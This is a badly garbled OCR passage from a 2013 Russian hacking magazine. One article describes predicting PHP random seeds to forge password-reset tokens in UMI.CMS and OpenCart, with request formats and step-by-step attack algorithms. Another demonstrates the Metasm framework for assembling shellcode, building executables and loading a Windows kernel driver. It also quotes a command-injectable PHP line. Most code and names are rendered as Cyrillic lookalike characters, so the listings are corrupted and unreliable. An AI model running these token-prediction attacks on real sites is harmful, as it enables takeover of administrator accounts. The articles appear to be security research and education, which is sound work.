#сІебпе СЕМЕКАТЕ_5ЕЕО() (((1оп§) (Иіте(Ѳ) * «-• 
в&рМСШ Л ( (І0П§) (1000000.0 * - 
рНр_сотЬіпесІ_1с§(Т5КМІ_5_С) ) ) ) 

#епсІ і-Р 

Кроме того, становятся предсказуемыми выводы таких функ- 
ций, как гапсШ, зЬиНІеП, аггау_гапсІ() и многих других. 

ЛОМАЕМ ІЛИІ.СМ5 

Прекрасная площадка для проведения атаки на РНР5Е55Ю — ІІМІ. 
СМ5 версии 2. 8. 5.3 (на данный момент уязвимость устранена). 

За генерацию токена для сброса пароля отвечает следующая 
функция: 

■РипсЬіоп §еТКапсІотРа55\люгсІ ($1еп8*Ь = 12) { 

$аѵІ_е1:1:ег5 = м $#@ л &!1234567890дкегІ:уиіо"; 

$зіге = $^г1еп($аѵІе-С-Сег5) ; 

$празз = 

-Рог($і = 0; $і < $1еп§1Ь; $і++) { 

$с = гап<і(0, $зіге - 1); 

$празз .= $аѵ1е**ег5[$с]; 

> 

геТигп $праз5; 

} 

Сброс пароля можно вызвать сразу после генерации новой 
сессии, отправив запрос: 

Р05Т ИНр : //Ьо5*/иті/и5ег5/Рог8е-С_сІо/ 

сНоо5е_Рог§е*=оп&Рог§е*_1о§іп=асІтіп 

Для этого необходимо знать лишь логин администратора. 

Получив РНР5Е55Ю в свежем процессе, выясняем сиды Ю6 зі 
и з2, а также идентификатор процесса. В случае успешного пере- 
бора воспроизводим операции, совершенные на сервере при гене- 
рации токена сброса пароля: 

• инициализируем І_С6 сидами зі и з2; 

• выполняем несколько вызовов І_СЗ (количество можетзависеть 
отверсии интерпретатора, ночаще всего эточислоравнотрем); 

• производим вызов 6ЕМЕКАТЕ_5ЕЕ0, указывая известный атаку- 
ющему Іітезіатр, идентификатор процесса и четвертый вызов 
І_С6, инициализируем МегзеппеТѵѵізІегполученным сидом; 

• вызываем функцию деіНапсіотРаззѵѵогсіІ), которая вернетнам 



072 



ХАКЕР 01 /168/2013 




Предсказания сбываются 



Восстановление пароля 

Пароль успешно изменен, на ѳ-таіі адрес, указанный при регистрации выслано уведомление 
Логин: айтіп 
Пароль: #1ХІ$ІІ2Тг А 1 

ІІИІ.СМ5 сдался без боя 

токен, и переходим по адресу Ьир://Ьо5І/иппі/и5ег5/ге5Іоге/ 
тсІ5(іокеп). 

Если все этапы алгоритма сработали правильно, то для учетной 
записи администратора будет установлен новый, известный нам 
пароль. 

АТАКУЕМ ОРЕМСАРТ 

Примечательной особенностью механизма инициализации гене- 
раторов псевдослучайных чисел для функций гапсН) и тІ_гапсі() 
в РНР является то, что отвечающий за данную операцию макрос 
6ЕМЕРАТЕ_5ЕЕ0 использует в качестве источника энтропии вывод 
значения генератора (_С6. 

Можно ли считать использование І_С6 в данном случае безопас- 
ным? Чтобы ответить на этот вопрос, представим веб-приложение, 
использующее сразу два ГПСЧ: І_СС и МегБеппе Тѵѵівіег. Если атаку- 
ющему удастся получить сид хотя бы одного из генераторов, то ему 
не составит труда подобрать сид другого. Примером такого веб- 
приложения может служить движок интернет-магазина ОрепСагІ 
версии 1.5. 4.1 (последняя на момент написания статьи). В нем 
присутствует следующий код, задача которого — сгенерировать 
безопасный токен для восстановления пароля администратора: 

$сосІе = 5Ьа1(ипіцісІ(тТ_гапсІ(), *гие)); 

А в предыдущих версиях использовался совсем смешной способ: 

$согіе = тс15(т*_гапсІ()); 

Итак, в данном случае мы имеем три источника энтропии: 

• тІ_гапс! — числос2 А 32возможнымизначениями; 

• ипіцігі — не что иное, как известный атакующему Іітезіатр через 
заголовок йаіе и тісгоііте (10 А 6 возможных значений), представ- 
ленные в Ьех-формате; 

• Ісд_ѵаІие — вывод І_С6 при вызове ипщісі со вторым аргументом. 

В итоге получается строка следующего вида: 92496817508764 
С6968487.41222311. Казалось бы, 5НА-1-хеш от такой строки точно 
не сбрутить, однако ОрепСагІ делает непозволительный подарок — 
в С5ВР-токене происходит утечка состояния Мегзеппе Тѵѵізіег: 

$Т6і5->5е55іоп->сІа1:а[ Чокеп' ] = тсІ5(тТ_гапс1()); 

Очевидно, что сбрутить Мй5 от числа 2 А 32 можно довольно 
быстро. Получив число, мы можем вычислить сид, вернее сиды, 
так как присутствуют коллизии. Для получения сидов на данный 
момент существуют следующие утилиты: 

• рбр_тІ_5еесІот5оІаг0е5Ідпег — использует СРІІ, нопри помощи 
55Е-инструкций покрывает весь диапазон менее чем за одну 
минуту І аоо.дІ/РікРб ): 

• рурЬр_гапб_ос1 от біКз— поддерживает как СРІІ, так и ОРІІ, 
справляется за -70 и -20 секунд соответственно (доо.дІ/гІЬМЛ : 

• т1_гапсІ брутер отопі — используетСІША, помимо прочего, поз- 
воляетнаходитьсидпри неполном выводеслучайныхзначений 

( аоо.дІ/ЦЕТтб ): 

• БпоѵѵОаке от Джорджа Аргироса — представляетсобой целый 
фреймворк для создания эксплойтов, реализующих атаки на слу- 
чайные числа ( доо.дІ/ХиѴВ2 І. 



Итак, алгоритм атаки включает следующие шаги: 

1. Атакующий, отправляя большое количество кеер-аііѵе запро- 
сов, заставляетвеб-серверсоздатьновые процессы сосвежими 
сидами. 

2. Отправляютсятри кеер-аііѵезапроса водном соединении: пер- 
вый— для получения Мй5-токена, второй — для сброса пароля 
атакующегои, наконец, третий— для сброса пароляадминистра- 
тора. 

3. Расшифровываетсятокен, почислупроизводится поисксида. 

4. Имея сид МегзеппеТѵѵізІег и некоторое количество коллизий, 
атакующий брутит два сида І_СБ— для этого требуется осуще- 
ствить перебор диапазона идентификаторов процесса (1024— 
32768), тісгоііте И 0 А 6 значений), а также дельты между первым 
и вторым замером времени. Как уже было сказано ранее, в боль- 
шинстве случаев разница между замерами не превышает трех 
микросекунд, поэтомусмыслаотподобногодействия практичес- 
ки нет. 

5. Получив некоторое количество возможных сидов 1_СС (обычно 

не больше 100), атакующий проводитеще один брутфорс — на этот 
раз 5НА-1 -токена для восстановления собственного пароля. Про- 
блем с брутом здесь нет, даже несмотря на то, что известны лишь 
первые десять символов хеша,— для таких случаев есть про- 
грамма РаззѵѵоггізРго, которая справляется даже с неполными хе- 
шами. Цель данного перебора — получить значение микросекунд, 
атакжеузнатьистинныесиды МТ и (_СС. 

6. Так как запросы были отправлены в одном соединении один 

за другим, разница в микросекундах между запросом на восста- 
новление пароля атакующего и администратора будет минималь- 
ной. Остается лишь подобрать искомое значение тісгоііте, имея 
точные сиды МТиІ_СС. 

При атаке на реальных системах может возникнуть несколько 
проблем: трудности с созданием новых процессов для получения 
свежего сида МТ, большая задержка между обработкой запро- 
сов на восстановление пароля, а также смещение І_С6 на разных 
версиях РНР. Что касается последнего — суть в том, что РНР 
делает вызовы рЬр_сотЬіпес!_Ісд() для своих внутренних нужд, 
например для генерации того же РНРБЕ55Ю, поэтому перед 
осуществлением атаки желательно узнать версию РНР и локаль- 
но определить, какой вызов І_СС используется для генерации 
кода для восстановления пароля атакующего и какой — админи- 
стратора. Например, для РНР 5.3.17 это пятый и восьмой вызовы 
соответственно. 

Для реализации атаки был создан брутфорсер сидов І_С6 
на СІША, который позволяет осуществить перебор полного диа- 
пазона значений меньше чем за полминуты. Программа есть 
на йѴО. 

ЗАКЛЮЧЕНИЕ 

В свете новых техник атак на ГПСЧ в РНР снова и снова насто- 
раживает реакция разработчиков интерпретатора. В результате 
нашего продолжительного общения с ними все, чего нам удалось 
добиться, — это обещание добавить в документацию преду- 
преждения о небезопасности использования функции тІ_гапсІ() 
для криптографических целей. Однако спустя несколько месяцев 
в документации так ничего и не появилось. Остается лишь пореко- 
мендовать разработчикам веб-приложений на РНР не полагаться 
на документацию, а использовать правильные методы, напри- 
мер функцию от греческих экспертов ( доо.дІ/от.1ѵп 1. Надежной 
энтропии! 30 

ІУАУАУІ 

• Работа Стефана Эссера 2008 года: доо.дІ/ ѵѵкгіхА ; 

• гаіпЬоѵѵ-таблицы для брута сидов на РНР: д оо.д|/г2ѵуМ5; 

• исследование Сами Камкара: доо.дІ/ООгіх; 

• анализ генераторов псевдослучайных чисел от Джорджа Аргироса и Агелоса 
Кияиса: доо. дІ/ С ШЬРК . 



ХАКЕР 01 /168/2013 



073 



взлом 



Запіаг Баізига ІзаІзигаЙгООіѵѵОгт.сот) 



Изучаем возможности 
фреймворка Меіхші 





Манипуляция с машинным кодом дает большие возможности 
как для программистов, так и для хакеров. Единственное, что является 
камнем преткновения для тех и других, — это динамический разбор 
структур, анализ и систематизация кода для эффективной работы с ним. 
Автоматизацию этой рутинной работы мы сегодня и рассмотрим. 



ГСШІІШ 

Вся информация 
предоставлена исключительно 
в ознакомительных целях. 

Ни редакция, ни автор не несут 
ответственности за любой 
возможный вред, причиненный 
материалами данной статьи. 



074 



ХАКЕР 01 /168/2013 




Метаморфозы 



ВВЕДЕНИЕ В ДИНАМИЧЕСКУЮ РЕКОМПИЛЯЦИЮ 

Что же такое динамическая рекомпиляция и зачем она нужна? С точ- 
ки зрения науки реверс-инжиниринга вопрос непростой, потому 
что включает в себя разбор больших структур бинарного кода с по- 
следующим анализом (отделением мух от котлет) и определенными 
действиями уже над подготовленным кодом. Компиляция — процесс 
однонаправленный, и в отличие от интерпретаторов и виртуальных 
машин компиляторы имеют на борту оптимизирующие бэкенды, ко- 
торые наглухо уничтожают всю «полезную» информацию для полно- 
ценного восстановления исходного кода скомпилированной про- 
граммы. Конечно же, есть возможность компиляции с драгоценной 
с точки зрения реверсера отладочной информацией (например, «дсс 
-д ./ргоді.с -о /ргод»), но на практике в геіеазе-версиях (то есть ко- 
нечных вариантах) это маловероятно. Ты должен понимать, что отла- 
дочная информация — это палка о двух концах, которая также может 
послужить кратчайшим путем для крекинга проприетарного ПО. 

Суть динамической рекомпиляции, которую также часто назы- 
вают двоичной трансляцией (Ьіпагу Ігап5ІаІіоп), заключается в эму- 
ляции одного набора инструкций на другом за счет трансляции 
машинного кода. Последовательности инструкций переводятся 
из исходного набора (зоигсе) в целевой (іагдеі) набор инструкций. 
Двоичная трансляция позволяет выполнять приложения одной 
архитектуры при работе на второй, причем для оптимизирующих 
двоичных компиляторов скорость выполнения кода зачастую полу- 
чается выше оригинала. Динамические рекомпиляторы бинарного 
кода могут быть реализованы как программно, так и аппаратно, 
причем программно они реализуются в двух вариантах: 

а) в качестветранслятора фронтенд-кода в пользовательском 
уровне (гіпдЗ); 

б) в виде гипервизора, работающего в режиме ядра (гіпд 0) и транс- 
лирующего код с архитектурой процессоров одной платформы 
для другой. 

Здесь нельзя не привести в пример разработанный для Арріе 
корпорацией Тгапзіііѵе программный пакет Позеиа для динамиче- 
ской трансляции между платформами на основе архитектур 5РАВС, 
РоѵѵегРС, МІР5, Ііапіит и х86. Уровень трансляции ВозеМа был 
включен в выпуски Мае 05 10.4 для Іпіеі-ориентированных Мае — 
это было необходимо для упрощения перехода от РРС к х86. 

Что касается аппаратных реализаций, то они, по сути, клониру- 
ют алгоритмы трансляции кода с последнего варианта софтверной 
реализации. Какты понял, возможности динамической рекомпиля- 
ции (если процесс не завершается обратной компиляцией) в целом 
намного шире, чем обычная двоичная трансляция с оптимизацией. 

Ниже хотелось бы представить несколько важных и перспек- 
тивных направлений, где может использоваться динамическая 
рекомпиляция: 

• динамическая декомпиляция и манипуляция кодом науровне 
ассемблера конкретной машины: морфинг, крипт, структурная 
обфускация инструкций, которыетак часто используются виру- 
сописателями; 

• динамическая декомпиляция с переводом ассемблеровских 
инструкций в псевдокод на любом из НідЬ І_еѵеІ І_апдиаде (далее 
просто НШ; 

• динамическая инструментализация бинарного кода для поис- 
ка узких мест (вопросы оптимизации), утечки памяти (тетогу 
Іеакіпд); 

• динамическая инструментализация бинарного кода с после- 
дующиманализом покрытия кодадля поискатипичныхошибок 
(ЬиКег оѵегЛоѵѵ, зіаск оѵегЛоѵѵ и так далее); 

• динамическая рекомпиляция бинарного кода с возможностью 
трейса и гибкой манипуляции кодом, которая можетиспользо- 
ваться для автоматических распаковщиков различного рода 
пакеров, крипторов, виртуализаторов исполняемых файлов. 

На ум сразу приходят динамические рекомпиляторы типа 
ѴаІдгіпсІ, РІІМ Тооікіі, ОупаппоРІО, которые часто используются 



• Л А ■ »оп*о>еіг>5сіОг -/пг*ю«тлстр** О 




Декомпиляция библиотеки ІіЬс дизассемблерам движком Меіавт 




Построение графа исполняемой программы, кстати, предоставляет 
больше возможностей, чем коммерческий №іп6гарЬ 



как средства для анализа покрытия кода. Некоторые иссле- 
дователи используют в качестве инструмента известную ныне 
связку реверс-инженера: ЮА Рго + ЮАРуіЬоп. В большинстве 
своем первые инструменты решают очень узкие задачи, то есть 
об универсальном подходе речи тут и не может быть. Для второго 
инструмента, как минимум, придется раскошелиться на платную 
версию Иды, ну и, соответственно, ознакомиться с АРІ ЮАРуіЬоп. 
Казалось бы, универсального и бесплатного инструмента для вы- 
шеперечисленных направлений не существует, но чудо, как оказа- 
лось, есть, и имя ему Меіазт. 

ШВЕЙЦАРСКИЙ НОЖ РЕВЕРС-ИНЖЕНЕРА 

Меіазт — довольно крутой фреймворк с открытым исходным кодом, 
позволяющий взаимодействовать с машинным кодом в различных 
форматах (шестнадцатеричным байт-кодом, кодом на Си и ассем- 
блером конкретной машины). Поддерживает подавляющее боль- 
шинство архитектур процессоров, форматов исполняемых файлов 
и работает на практически всех известных операционных системах. 
Впервые данная разработка была представлена Йоанном Гийо 
(Уоапп биіііоі) из Е5ЕС на конференции 55ТІС 2007, и позднее на ней 
практиковались на нескольких конференциях Наск.Іи. Кстати, 
Меіазт является сердцем такого известного и любимого инструмен- 
та пентестеров и хакеров всех мастей, как Меіазріоіі Ргатеѵѵогк. 

Основная часть фреймворка, которая именуется движком, 
написана на ВиЬу. Установка довольно проста, единственное, 
что для нее требуется сделать, — это прописать пути в переменные 
окружения пользовательского интерпретатора. Если ты так же, 
как и я, используешь в качестве интерпретатора ЬазЬ, тебе после 
распаковки библиотеки нужно будет добавить следующую строку 
в ~/.ЬазЬ_ргоЛ Іе: 

ехрогТ КІІВѴІ_ІВ=$КІІВѴІЛВ:/<путь до 6иблиотеки>/те1:а5т 

Для пользователей ѴѴіпсіоѵѵз вопрос решается аналогичным об- 
разом, если они работают с судѵѵіп (эмулятор ІІІМІХ-среды). В любом 
другом случае идем в переменные окружения 05 ѴѴіпсІоѵѵз: свойства 
«Моего компьютера», на вкладке «Дополнительно» находим «Пере- 



ХАКЕР 01 /168/2013 



075 




взлом 



менные окружения». Если у тебя уже стоит Руби, то там должна 
быть переменная РІІВУЫВ (если ее нет, то создаем вручную), в кото- 
рую нужно будет как раз таки дописать путь до самой библиотеки. 

Чтобы проверить, работает ли наша библиотека, достаточно 
вписать в консоль следующую команду: 

$ гиЬу -г теіазт -е 'р Меіазт: :ѴЕК5ІОГ 
1 



С установкой разобрались, теперь рассмотрим краткий пере- 
чень возможностей фреймворка: 

• интерактивная работа и гибкая манипуляция исполняемыми 
файлами: РЕСОРР, Е1.Р, МасЬ-0, Раѵѵ ЗЬеІІсосІе; 

• компиляция с нуля без использования компиляторов, линкеров 
и тому подобного инструментария; 

• дизассемблирование и базовая декомпиляция в псевдокод С-Ііке 
НИ; 

• манипуляция структурой файлов. 

ПОСТАНОВКА ПРОСТЫХ ЗАДАЧ 
И БЫСТРОЕ РЕШЕНИЕ 

Выше мы рассмотрели перспективные направления динамической 
рекомпиляции, теперь пришло время продемонстрировать возмож- 
ности фреймворка на деле. Итак, есть простая задача компиляции 
сырого Ыпих-шелл-кода на азт. Ниже приведен пример сборки 
шелл-кода без использования компилятора. 

Подключаем нашу библиотеку: 



• ^ Л г т оотломлкмі 




МеІа$т предоставляет возможность просмотра энтропии и удобную 
навигацию по секциям, строкам, функциям файла 



тоѵ 


еЬх. 2аб 


; @зыі 


ЬЬ2а0000ѲѲ 


іп* 


.с 

ф 

00 


І @406 


ССІ80 


ге* 




; @426 


сЗ епсізиЬ еп*гуроіп*_Ѳ 



Собственно, ты можешь сравнить этот код с дизассемблерным 
листингом, полученным с помощью пЫзазт из пакета 1МА5М. 

$ псіізазт -Ь32 ./*ез*1.оиі: 



гециіге ’теТазт’ 

Вызываем модуль ассемблирования, тип исполняемого файла 
а.оиі, архитектура процессора ІА-32 (то есть х86), выхлопной файл 
Іезіі.оиі, в переменную ВА\Л/_5НЕІ_І_С00Е заносим буфер с кодом 
нашего шелл-кода: 

МеТазт: гАОи-С.аззетЫеСМеТазт: :Іа32.пем, 

«КАИ_5НЕІ.І.С(ЮЕ) . епсос1е_61е( ЧезП.оиГ ) 

.Тех* 

.епТгуроіп* 
тоѵ еах, 4 
тоѵ еЬх, 1 

. Оаіа 

з*г сіЬ ’Чезі:\\п" 
зТгепс! : 

Чех* 

тоѵ есх, з*г 

тоѵ есіх., 5*гепсі - з*г 

іп* 806 // Ііпих зуз_игі*е 

тоѵ еах, 1 
тоѵ еЬх, 42 

ІП* 806 // Ііпих зуз_ехі1: 
геТ 

КАИ_5НЕІ_1_С00Е 

Отлично, проверяем наш сырой шелл-код и видим, что он ра- 
ботает, дизассемблировав встроенным дизассемблером (который 
идет в папке с примерами /затріез): 

$ гиЬу ./*ез*1.гЬ 

$ гиЬу ./сІізаззетЫе. гЬ --по-сіа1:а --ери Іа32 ./*ез*1.ои* 
еп*гуроіп*_0: 

асісі [еах], аі ; @0 0000 

аОсІ -Рз:[еах], аі ; @2 640000 

асіс [еах], аі ; @5 1000 



Такой дизассемблерный дамп легко будет распарсить тем же 
МеІазт/ВиЬу и в дальнейшем манипулировать этим кодом 
как душе угодно — оптимизировать узкие места, транслировать 
в опкоды других машин, разбивать и переводить в микод (МиІаЫе 
Іпсіерепсіепі Собе) и так далее. 

А как насчет декомпиляции и перевода в псевдокод НЩ на- 
пример, реального работающего исполняемого файла библиотеки 
ІіЬс? После некоторой возни интерпретатора Руби и шуршания 
процессора на выходе мы получим: 

$ гиЬу . /СІізаззетЫе. гЬ --по-сіа1:а --сри Іа32 --ехе Е1.Р «-* 
/1іЬ/1іЬс.50.6 --сіесотрііе 

Качество кода не сказать что хорошее, но и не особо плохое, 
к примеру, для морфинга на уровне исходных кодов или в качестве 
легитимного стаба для исполняемых файлов полученный код очень 
даже хорош. Если немного посидеть и поработать над модулем де- 
компиляции, естественно, можно добиться куда лучших результа- 
тов. Для более качественной декомпиляции можно изменить под- 
ход, например на ступени генерации ІР (Ііегтегііаіе Рерге 5 еп*аІіоп) 
разбивать код на специальные блоки (узлы графа), далее на основе 
сигнатур методом сопоставления восстанавливать структуры кода. 
Реализация идеи довольно проста, по сути, представляет собой 
специальный конструктор конечного автомата на основе множе- 
ства свитчкейсов РиЬу-кода: сазе зотеіЬіпд ѵѵбеп «1» ... ѵѵбеп «2» 

... и так далее. Если прикрутить сюда модули генерации правдо- 
подобных имен переменных, функций, процедур, можно получить 
более-менее полноценный декомпилятор. Подняв же веб-панель 
на РиЬу оп Раііз, можно за короткое время организовать и неплохой 
сервис по декомпиляции ПО. 

Текущий псевдокод больше поход на выхлоп фронтендовой 
части компилятора дсс, на этапе генерации синтаксического дере- 
ва. Такой код легко перегнать в Р1-код (Розіііоп Іпберепсіепі Сосіе, 
не путать с р-кодом виртуальных машин). Скрипт сІізаззетЫе. 
гЬ принимает намного больше параметров и, соответственно, 
предоставляет большие возможности для манипуляции процессом 
дизассемблирования. В папке затріез ты также можешь найти 
сценарий сІізаззетЫе-диі.гЬ, представляющий собой графическую 
прослойку над консольным дизассемблером. 



076 



ХАКЕР 01 /168/2013 



Метаморфозы 



ЬагкЯвг сірЬегегі іп»ігис(іоп 




Архитектура виртуальной машины Т2 Ме(а$т 



СБОРКА ИСПОЛНЯЕМЫХ ФАЙЛОВ НА НИ 

Выше мы рассмотрели компиляцию сырого шелл-кода, в котором 
обошлись без использования компиляторов. Это уже впечатляет, 
а что ты скажешь, если мы решим компилировать Си-код с исполь- 
зованием ѴѴІМ32АРІ? Веришь или нет, но Меіазт может и не такое! 
Подключаем нашу библиотеку: 

гециіге 'теТазт' 

Дальше описываем параметры для сборки бинаря: первый 
параметр ехесіазз, в который попадает тип исполняемого файла 
МеІазт::РЕ, можно выбрать и другие типы Е1_Р/МасЬ0, с помощью 
второго параметра згсІуре_сіаІа указываем, что наш код на С (по- 
нятно, что можно указать и азт, если у нас код на ассемблере): 

$орТз = { :ехес1а55 => МеТазтхРЕ, : згс*уре_с1а1:а => 'с' } 

Склеиваем исходники нашего файла и сэмпла ехеепсосіе.гЬ, 
представленного как раз для компиляции НИ-исходников: 

ІоасІ Рі1е.зоіп(Рі1е.сІігпате( РНЕ ), 'ехеепсоде.гЬ') 

_ЕЮ_ 

Ниже представлен код на Си. Если внимательно рассмотреть 
этот код, можно заметить, что МпАРІ-функции тут представлены 
декораторами, и их в обязательном порядке нужно вначале объ- 
являть в виде прототипов. Ты также должен понимать, что любые 
другие функции из ряда СРТ/РН/ЫВС и прочих библиотек также 
должны описываться в виде прототипов прежде, чем ты сможешь 
использовать их в своем коде. 

зТсІсаІІ іпТ МеззавеВохСіпС,, сбаг*, сЬаг* л іпі); 

5*сІса11 ѵоісі ЕхіТРгосеззСіпі:); 

ѵоіР таіп(ѵоісі) 

{ 

МеБ5абеВох(0, "Бапзаг 5а*зига", "Иеііо", 0); 
ЕхіТРгосе55(0); 

} 

Высокоуровневый код тут можно мешать также и с ассембле- 
ром, как отдельно в виде связки С + А5М кода, так и в виде инлай- 
новых ассемблерных вставок прямо в Си-коде. Тот же самый код 
на чистом ассемблере х86 будет выглядеть так: 

гециіге ’теТаБпГ 



Создаем переменную ре в качестве хендла для манипуляции 
кодом. Указываем тип исполняемого файла, в данном случае — РЕ, 
наш код на ассемблере, поэтому применяем метод аззетЫе, так 
как код мы пишем для х86, ОС указываем в качестве архитектуры 
Іа32. В переменную ЕОБ методом НЕРЕйОС помещается наш код 
на ассемблере: 

ре = МеТазт: :РЕ.аззетЫе МеТазт: :Іа32.пем, <<Е05 

.епігуроіпі 
ризЬ 0 
ризЬ ТіТІе 
ризЬ тезза§е 
ризЬ 0 

саіі Мез5а§еВохА 

хог еах, еах 
геТ 

.РаТа 

тезза§е сІЬ ’5ап^аг Ба^зига', 0 

ТіТІе РЬ ’ Ьеііо ' , 0 

ЕОБ 

Собираем наш исполняемый файл: 
ре.епсоРе_Я1е ЧезТре.ехе' 

В исходниках, приложенных к данной статье, ты можешь найти 
демку, цель которой — продемонстрировать ход трансляции и ко- 
догенерации рубинового компилятора Меіазт. Думаю, не нужно 
быть гением, чтобы понять, какой профит можно сорвать на этой 
теме. Если посмотреть на внутренности предложений черного 
рынка, к примеру услуги «уникальных» крипторов/протекторов, 
предоставляющих доступ через веб-интерфейс, можно понять, 
насколько они убоги в реализациях. И неудивительно, что все 
сервисы подобного рода оказываются построены на РНР (веб- 
интерфейс, шлюз) и исполняемом бинарном движке, работающем 
в подавляющем большинстве (99,8%) на ѴР5 с ОС ѴѴіпсіоѵѵз. Доба- 
вим сюда криворуких кодеров подобных веб-сервисов с конструк- 
циями кода типа: 



5у5іет_ехеси1:е( ' С : \\5ХСгурТог\еп§іпе . ехе «-■ 
--іприТ^бІе ' .$_СЕТ["Я1е_ісГ] . ' ^ 
--ои*ри*_б1е ' .гапгі_Л($-Епате) . ' ♦-* 

— сііг ' .$мгк_с!іг) ; 



Все, что мы рассмотрели выше, еще цветочки по сравнению 
с тем, что этот волшебный фреймворк нам позволяет написать. Так 
вот, он позволяет создавать не только гіпд 3 приложения, но и мо- 
дули ядра, драйверы для известных пользовательских операцион- 
ных систем, работоспособность которых тут же можно проверить 
при помощи встроенных ѴМ. Звучит круто? Давай попробуем 
создать полноценный драйвер с возможностью загрузки и вы- 
грузки. Ниже я приведу фрагменты кода с комментариями, полный 
исходник драйвера ты можешь найти на нашем диске. 

геяиіге ’теТазпГ 

Обрати внимание: ниже мы не инклудим библиотеку, в данном 
случае слово іпсіигіе необходимо для перевода имени класса 
Меіазт в глобальную область видимости. В С++/С# за это ответ- 
ственна конструкция «изіпд патезрасе ***». До этого мы делали 
так: МеІазт::РЕ. аззетЫе, Ме1азт::1а32.пеѵѵ. В дальнейшем кон- 
струкцию Меіазт:: можно будет не писать. 



ХАКЕР 01 /168/2013 



077 






взлом 



іпсіисіе Меііазт 

# Имя нашего драйвера 
$с!гѵ = 'сІгѵ^-СеБ-С.зуз' 

# Размер буфера обычно используется для трейса драйвера, 
здесь мы его рассматривать не будем 

ЕШР_52 = 0 

# Проверяем, существует ли файл нашего драйвера 
і* по* Рііе.ехіз*? $с!гѵ 

Собираем драйвер, в переменной 0РѴ_С(ЮЕ содержится код на- 
шего 32-битного драйвера для ѴѴіпсІоѵѵз. Опция ктогі в епсосіе_ПІе 
указывает, что драйвер работает на уровне ядра: 

РЕ . а5зетЫе(Іа32. пей, <<ОКѴ_С(ЮЕ) .епсосІе_б1е*-' 

($сігѵ, ' ктосі ’ ) 

#сІебпе Ьи-Рзг #{ВиР_52> 

. сіаіга 

оші 66 0,ѳ 
0ІСІІ15 66 0,0 
Ьи-Р сісі Ьи-Рзг с!ир(?) 

.еп*гуроіп* 
тоѵ еах, [езр+4] 

тоѵ сіиогсі р*г [еах+0х34], ипіоасі 
саіі зе*ир_ісІі: 
хог еах, еах 

// Размер используемого буфера 

тоѵ [Ьи-Р], еах 

ге* 

Для запуска и останова напишем Си-обертку. ОупІ_сіг — специ- 
альный каркасный модуль Меіазт, позволяющий интерпретатору 
РиЬу манипулировать экспортируемыми АРІ-функциями динамиче- 
ски разделяемых библиотек (*ЫІ, *зо). 

0уп1.сІг.пем_арі_с <<ОКѴ_С(ЮЕ 
// Определяем типы и структуры данных 

■СуреОе-Р іп* ВООІ.; 

■СуреОе-Р сЬаг СНАК; 

*уресіе-Р ипзіепесі 1оп§ Ш)Р0; 



Здесь, как и описывалось ранее, задаем прототипы ѴѴіпАРІ- 
функций: 

5*сІса11 ВООІ. СІозеБегѵісеНапсІІе^ 

(5С_НАМ0І_Е ЬБСОЬз'ес* ___а*1:гіЬи1:е__((іп)))і 

5*сІса11 5С_НАШІ.Е 

Сгеа*е5егѵісеА(5С_НАІЮІ.Е Ь5СМапа§ег ♦-« 
_а«гіЬи1:е_((іп)), 1.РС5ТК ІрБегѵісеМате «-* 
_а**гіЬи*е_((іп)), 1.РС5ТК ІрОізрІауМате - 

а**гіЬи*е ( (іп) ),ОІлЮКО сМіезігесіАссезз - 

а**гіЬи*е ( ( іп) ) , ЭМОКО 



Константы, используемые импортируемыми выше АРІ- 
функциями 

#с!ебпе 5ТАШАКО_КІСНТ5_КЕ<21ЛКЕО (0Х000Р00001.) 

#сІебпе 5С_МАМАСЕК_СОМЕСТ 0x0001 

#0ебпе 5С_МАМАСЕК_СКЕАТЕ_5ЕКѴІСЕ 0x0002 



Ну и, собственно, код для загрузки/выгрузки драйвера: 



# Создаем функцию Іоасітосі, где переменной тосі 
присваивается указатель на наш драйвер 

Ое-Р Іоасітосі (тосІ=$сІгѵ) 

После того как модуль ОупЬсІг подгрузил все нужные АРІ из про- 
тотипов, имена функций можно писать в нижнем регистре. Пере- 
менная зЬ является хендлом для открытия менеджера управления 
сервисами. Без старта ОрепБСМападегАО мы не можем стартовать 
сервис нашего драйвера СгеаІеБегѵісеАП. 

зЬ = Эупісіг.орепзстапабега^ 

(0, 0, ЭуШсІг: :5С_МАМА6ЕВ_АИ_АССЕ55) 

# Выплевываем ошибку при возникновении исключения 

гаізе "саппо* орепзст" і-Р (зЬ == 0) 

Переменная гЬ является хендлом функции старта сервиса, 
функцией СгеаІеБегѵісеАО запускаем сервис, передав параметры 
для запуска, так, параметр 5ЕРѴІСЕ_КЕВМЕІ__0ВІѴЕВ указывает 
на то, что это драйвер режима ядра. 

гЬ = ОупІ-сІг.сгеаІіезегѵісеаСзЬ, тосі, тосі, -< 

ОуШсІг: :5ЕКѴІСЕ_АИ_АССЕ55, 

ОупЮг: :5ЕКѴІСЕ_КЕКМЕІ._0КІѴЕК, <м 
РупІОг: :5ЕКѴІСЕ^ЕІШЮ_5ТАКТ, «е 
ОупЬсІг: :5ЕКѴІСЕ_ЕККОК_МКМАІ_, ^ 

Рі1е.ехрапсІ_ра-СІі(тосІ), 0, 0, 0, 0, 0) 

# Стартуем сервис 

і-Р (0упІ_сІг.5І:аг*:5егѵісеа(гІі, 0, 0) == 0) 
гаізе "саппо* з*аг* зегѵісе" 
епсі 

# Закрытие хендлов в обратном порядке, 

# по типу І.ІРО ((.аз* Іпри* Рігзі: Ои*) 

0упІ,сІг.С1о5е5егѵісеНапсІ1е(гЬ) 

0упІсІг.С1о5е5егѵісеНапсІ1е(5Іі) 

епсі 

# Функция выгрузки драйвера 

сІе-Р ип Іоасітосі (тосІ=$сІгѵ) 

зЬ = 0упІ_сІг.ореп5стапа§ега.-' 

(0, 0, РупІ-СІг: :5С^Ш^АСЕК_А^^_АССЕ55) 
гаізе "саппо* орепзст" і-Р (зЬ == 0) 
гЬ = Оупісіг.орепзегѵісеа^ 

(зИ, той, Оупібг: : 5ЕКѴІСЕ_Аи._АССЕ55) 

Функция СопІгоІБегѵісеП позволяет нам управлять сервисами. 

В качестве параметров принимает хендл гЬ и параметр 5ЕРѴІСЕ_ 
С0МТВ01__5Т0Р, который останавливает сервис. 

ОупІ_йг. соп*го1зегѵісе^ 

(гЬ, ОуШйг: :5ЕКѴІСЕ_С(ЖТКОІ_5ТОР, 0.сЬг*4*32) 

# Удаляем сервис функцией Ое1е*е5егѵісе() 
Оупіаг.аеІе-Сезегѵісе(гЬ) 

ОуШйг. СІозеБегѵісеНапйІе(гЬ) 

ОуШйг. С1озе5егѵісеНапй1е(зН) 
епа 

Наш скрипт принимает параметры [см. полный исходник на дис- 
ке) для загрузки и выгрузки соответственно. Если же параметры 
не указываются, скрипт просто генерирует драйвер, проверяя вна- 
